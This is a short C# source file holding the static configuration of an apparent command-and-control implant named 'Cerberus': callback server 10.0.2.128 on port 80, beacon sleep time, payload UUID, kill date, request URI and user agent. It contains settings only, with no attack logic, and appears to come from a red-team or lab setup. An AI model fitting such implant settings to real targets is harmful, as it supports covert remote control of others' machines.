using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus
{
    public class Config
    {
        public static string ServerAddress { get; set; } = "10.0.2.128";
        public static int ServerPort { get; set; } = 80;
        public static int SleepTime { get; set; } = 5000;
        public static string PayloadUUID { get; set; } = "0787e71b-d47a-484b-96ae-4b89e6213346";
        public static string killdateString { get; set; } = "2023-06-24";
        public static string URI { get; set; } = "/data";
        public static string UserAgent { get; set; } = "Joker";
        public static string HostHeader { get; set; } = null;
    }
}
